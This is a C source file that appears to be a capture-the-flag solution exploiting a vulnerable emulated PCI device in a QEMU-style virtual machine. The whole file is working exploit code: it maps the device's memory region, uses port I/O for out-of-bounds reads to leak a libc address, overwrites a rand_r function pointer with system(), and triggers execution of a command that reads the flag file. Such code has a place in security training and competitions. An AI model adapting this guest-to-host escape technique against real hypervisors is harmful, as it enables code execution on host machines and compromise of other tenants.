#include<stdio.h>
#include<stdlib.h>
#include<sys/mman.h>
#include<fcntl.h>
#include<stdint.h>
#include<sys/io.h>

unsigned char* mmio_mem;
uint32_t pmio_base = 0xc050;

void mmio_write(uint32_t value,uint32_t addr){
	*((uint32_t*)(mmio_mem + addr)) = value;
}

uint32_t mmio_read(uint32_t addr){
	return *((uint32_t*)(mmio_mem + addr));
}

void pmio_write(uint32_t addr, uint32_t value){
	outl(value, addr);
}

uint32_t  pmio_read(uint32_t addr){
	return (uint32_t)inl(addr);
}


void die(char* s){
	puts(s);
	exit(-1);
}

void main(){

	// MMIO
	int mmio_fd = open("/sys/devices/pci0000:00/0000:00:03.0/resource0", O_RDWR|O_SYNC);
	if(mmio_fd == -1){
		die("mmio_fd open failed");
	}
	mmio_mem = mmap(0, 0x1000, PROT_READ|PROT_WRITE, MAP_SHARED, mmio_fd, 0);
	if(mmio_mem == MAP_FAILED){
		die("mmap mmio_mem failed");
	}

	/*
	Constructing little endian using pwnlib.until.packing.unpack_many: 
	list(map(hex,unpack_many("cat /home/unravel/flag\x00\x00", 32, endian="little"))), must be 32-bit aligned.
	['0x20746163', '0x6d6f682f', '0x6e752f65', '0x65766172', '0x6c662f6c', '0x6761']
	*/

	// Write string for rand_r() params.
	mmio_write(0x20746163, 0x8);
	mmio_write(0x6d6f682f, 0xc);
	mmio_write(0x6e752f65, 0x10);
	mmio_write(0x65766172, 0x14);
	mmio_write(0x6c662f6c, 0x18);
	mmio_write(0x6761, 0x1c);

	// PMIO
	if(iopl(3) != 0){
		die("I/O permission is not enough");
	}

	// read anywhere
	pmio_write(pmio_base + 0, 264);
	unsigned long long srandom = pmio_read(pmio_base + 4);
	srandom <<= 32;
	printf("srandom high = 0x%llx\n", srandom);
	pmio_write(pmio_base + 0, 260);
	srandom |= pmio_read(pmio_base + 4);
	printf("srandom = %llx\n", srandom);

	// leak libc base
	unsigned long long libc_base = srandom - 0x475c0;
	printf("libc_base = %llx\n", libc_base);

	// calculate system() address
	unsigned long long system_addr = libc_base  + 0x52290;
	printf("system = %llx\n", system_addr);

	// hijack rand_r() function to system() function
	pmio_write(pmio_base + 0, 276);
	pmio_write(pmio_base + 4, (uint32_t)system_addr & 0xffffffff);
	puts("hijack rand_r() success");

	// call system
	mmio_write(12, 0);

}
